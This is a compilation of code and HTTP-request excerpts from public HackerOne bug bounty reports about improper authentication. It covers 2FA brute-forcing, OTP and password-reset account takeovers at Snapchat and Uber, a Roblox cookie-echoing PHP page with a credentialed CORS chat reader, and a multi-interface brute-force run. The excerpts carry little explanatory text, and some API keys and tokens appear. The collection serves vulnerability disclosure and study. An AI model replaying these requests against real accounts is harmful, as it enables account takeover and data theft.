Host: c5-eu-1.algolianet.com
....

{"applicationID":"APP_ID","signature":"SIGNATURE","offset":0,"length":1000,"type":"all"}
```

```
{
                "timestamp": "2016-08-04T15:15:01Z",
                "method": "POST",
                "answer_code": "200",
                "query_body": "\n{\n  \"params\": \"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\"\n}\n",
                "answer": "\n{\n  \"hits\": [\n    {\n      \"name\": \"Monica Bellucci\",\n      \"rating\": 3956,\n      \"image_path\": \"/z3sLuRKP7hQVrvSTsqdLjGSldwG.jpg\",\n      \"alternative_name\": \"Monica Anna Maria Bellucci\",\n      \"objectID\": \"5\",\n      \"_highlightResult\": {\n        \"name\": {\n          \"value\": \"<em>Monica</em> Bellucci\",\n          \"matchLevel\": \"full\",\n          \"fullyHighlighted\": false,\n          \"matchedWords\": [\n            \"monica\"\n          ]\n        },\n        \"alternative_name\": {\n          \"value\": \"<em>Monica</em> Anna Maria Bellucci\",\n          \"matchLevel\": \"full\",\n          \"fullyHighlighted\": false,\n          \"matchedWords\": [\n            \"monica\"\n          ]\n        }\n      },\n      \"_rankingInfo\": {\n        \"nbTypos\": 0,\n        \"firstMatchedWord\": 0,\n        \"proximityDistance\": 0,\n        \"userScore\": 499,\n        \"geoDistance\": 0,\n        \"geoPrecision\": 1,\n        \"nbExactWords\": 0,\n        \"words\": 1,\n        \"filters\": 0\n      }\n    }\n  ],\n  \"nbHits\": 1,\n  \"page\": 0,\n
```

## #77076 GA code not verified on the server side allows sending Verification Documents on behalf of another user — enter — $250 — Improper Authentication - Generic
Source: `hackerone/reports/2015/77076.md` (https://hackerone.com/reports/77076)

```
    "kioskEnrollmentStatusType" : "DENIED"
```

## #122050 Mapbox API Access Token with No Scope Can Read Styles — mapbox — $200 — Improper Authentication - Generic
Source: `hackerone/reports/2016/122050.md` (https://hackerone.com/reports/122050)

```
GET /styles/v1/katilthe?access_token=pk.eyJ1Ijoia2F0aWx0aGUiLCJhIjoiY2lsbWJwcWpjNjhmNnZubWNhYXdwZm5obyJ9.2cPnaIiXcFnDRFMfrD1TRw HTTP/1.1
Host: api.mapbox.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.mapbox.com/studio/styles/fonts/
Origin: https://www.mapbox.com
Connection: keep-alive

I Got 200 OK in response and my styles.
```

## #99969 User with limited access to Index configuration can rename the Index — algolia — $200 — Improper Authentication - Generic
Source: `hackerone/reports/2016/99969.md` (https://hackerone.com/reports/99969)

```
POST /1/indexes/<index name>/operation?x-algolia-api-key=395d4963afcdba0c00f4e8847459a8fd&x-algolia-application-id=JC6IO59O0A&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5 HTTP/1.1
Host: c1-in-2.algolianet.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.algolia.com/explorer
Content-Length: 39
Origin: https://www.algolia.com
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

{"operation":"move","destination":"put index name here"}
```

## #662218 Talk - Leak of password-protected room name via already existent resource addition — nextcloud — $150 — Improper Authentication - Generic
Source: `hackerone/reports/2020/662218.md` (https://hackerone.com/reports/662218)

```
        POST /nextcloud/nextcloud/ocs/v2.php/collaboration/resources/collections/21?format=json HTTP/1.1
        Host: 192.168.0.104
        User-Agent: [...]
        Accept: application/json, text/plain, */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/json;charset=utf-8
        requesttoken: [...]
        Content-Length: 43
        Connection: close
        Cookie: [...]
```

```
        {"resourceType":"file","resourceId":"1619"}
```

```
    {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":{"id":21,"name":"privateprivateprivate","resources":[{"type":"file","id":"1619","name":"aaaa.txt","path":"files\/aaaa.txt","link":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/index.php\/f\/1619","mimetype":"text\/plain","preview-available":true},{"type":"room","id":"w3die6ou","name":"privateprivateprivate","call-type":"public","iconUrl":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/apps\/spreed\/img\/app-dark.svg","link":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/index.php\/call\/w3die6ou"}]}}}
```

## #128777 No rate-limit in Two factor Authentication leads to bypass using bruteforce attack — algolia — $100 — Improper Authentication - Generic
Source: `hackerone/reports/2016/128777.md` (https://hackerone.com/reports/128777)

```
POST /users/testqr HTTP/1.1
Host: www.algolia.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.algolia.com/users/displayqr
Cookie: __cfduid=dbe6010b3183f275b85d61f6dbce0417a1459962341; _ga=GA1.2.1293083525.1459962367; PRUM_EPISODES=s=1459971091672&r=https%3A//www.algolia.com/users/displayqr; _session_id=c8f877144126b9e3142d158ce5fbadfb; kvcd=1459971056919; km_ai=20868; km_uq=; km_lv=x; visitor_id139121=7630498; __cid=2af41b1f-9f59-4c7e-a3ef-e0c43327b92f; km_ni=20868; _hjIncludedInSample=1; _gat=1; _dc_gtm_UA-32446386-9=1; km_vs=1; km_identity=f7975d47418f3d188a1ed45468bc2c7e; _gat_UA-32446386-9=1; km_aliased=true
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 168

utf8=%E2%9C%93&authenticity_token=twHnV25SUnlKr2rqoBCjEcZ5M749eY1aLiX8gL9f7NiR4PJreIlBlBtn3X6F6qi7Z1JBQOKNgFxFVKapX4lCdg%3D%3D&users%5Bgauth_token%5D=6700&commit=Verify
```

## #490946 Bypassing lock protection — nextcloud — $50 — Improper Authentication - Generic
Source: `hackerone/reports/2019/490946.md` (https://hackerone.com/reports/490946)

```
     AuthenticatorActivity.java:303
      mAccount = getIntent().getExtras().getParcelable(EXTRA_ACCOUNT);
```

## #921780 Improper Authentication - any user can login as other user with otp/logout & otp/login — snapchat — - — Improper Authentication - Generic
Source: `hackerone/reports/2021/921780.md` (https://hackerone.com/reports/921780)

```
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:39:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding
x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
server: API Gateway
cache-control: no-cache, no-store
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snapchat-request-id: █████
x-snapchat-server-latency: 342
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 137

{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
```

```
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

## #335330 Subdomain Takeover to Authentication bypass  — roblox — - — None
Source: `hackerone/reports/2020/335330.md` (https://hackerone.com/reports/335330)

```
<html>
<body>
<?php
echo "Cookies received: <br>";

foreach ($_COOKIE as $key=>$val)
  {
    echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n";
  }
?>
</body>
</html>
```

```
<h2>CORS To Read Chat</h2>
<div id="demo">
<button type="button" onclick="cors()">Chat Reader @ Roblox</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = document.write(this.responseText);
    }
  };
  xhttp.open("GET", "https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
```

```
    echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n";
```

## #129873 Bypassing Digits origin validation which leads to account takeover — x — - — Improper Authentication - Generic
Source: `hackerone/reports/2020/129873.md` (https://hackerone.com/reports/129873)

```
e.exports = {
    sdk_host: "https://www.digits.com",
[..]
onReceiveMessage: function(t) {
    this.config && -1 !== this.config.get("sdk_host").search(t.origin) && this.resolve(t.data)
},
```

```
    this.config && -1 !== this.config.get("sdk_host").search(t.origin) && this.resolve(t.data)
```

## #1342088 Flickr Account Takeover using AWS Cognito API — flickr — - — Improper Authentication - Generic
Source: `hackerone/reports/2021/1342088.md` (https://hackerone.com/reports/1342088)

```
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
[...]

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

```
HTTP/2 200 OK
Date: Thu, 16 Sep 2021 22:51:36 GMT
[...]

{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
    "ChallengeParameters":
        {            
        }
}
```

```
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
{
    "Username": "e28c344[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e28[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-attacker@lauritz-holtmann.de"
        }
    ]
}
```

## #143717 Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical) — uber — - — Improper Authentication - Generic
Source: `hackerone/reports/2016/143717.md` (https://hackerone.com/reports/143717)

```
POST /rt/users/passwordless-signup HTTP/1.1
Host: cn-geo1.uber.com
User-Agent: client/iphone/2.137.1
Connection: close
Content-Type: application/json
Content-Length: 197

{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}
```

```
{"phoneNumberE164":"+xxxxxxxx","serverState":"SUCCEEDED","serverStateData":{"nextState":"SIGN_IN"},"tripVerifyStateData":{},"userMessage":"New password has been created. Please login with the new Password.","userRole":"client","userWorkflow":"PASSWORDLESS_SIGNUP"}
```

## #110293 Insufficient OAuth callback validation which leads to Periscope account takeover — x — - — Improper Authentication - Generic
Source: `hackerone/reports/2019/110293.md` (https://hackerone.com/reports/110293)

```
CONSUMER_KEY: █████████
CONSUMER_SECRET: ███
```

## #219205 Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com — uber — - — Improper Authentication - Generic
Source: `hackerone/reports/2017/219205.md` (https://hackerone.com/reports/219205)

```
# nslookup saostatic.uber.com 8.8.8.8
Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
```

## #127844 Web Authentication Endpoint Credentials Brute-Force Vulnerability — security — - — Improper Authentication - Generic
Source: `hackerone/reports/2016/127844.md` (https://hackerone.com/reports/127844)

```
# cat 10k_most_common.txt | wc -l
10001

# tail 10k_most_common.txt 
hoes
howie
hevnm4
hugohugo
eighty
epson
evangeli
eeeee1
eyphed
Geniaal2!!
```

```
# ifconfig
lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

venet0    Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  
          inet addr:127.0.0.2  P-t-P:127.0.0.2  Bcast:0.0.0.0  Mask:255.255.255.255
          inet6 addr: 2a04:XXXX:0:32::1001/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1010/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1023/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1032/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1045/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1054/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1076/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1067/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1089/64 Scope:Global
          inet6 addr: 2a04:XXXX:0:32::1100/64 Scope:Global
(...SNIP...)

# python hackeronebrute.py 
[INFO] Usage: python hackeronebrute.py <USERNAME> <PASSWORD_DICTIONARY_FILENAME> <INTERFACES (CSV)> <THREADS> [DEBUG]

# python hackeronebrute.py ██████████ 10k_most_common.txt venet0 50 
[INFO] Number of interfaces: 677
[INFO] Number of interfaces per thread: 13
[INFO] Total # threads: 50
[INFO] To
```

```
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

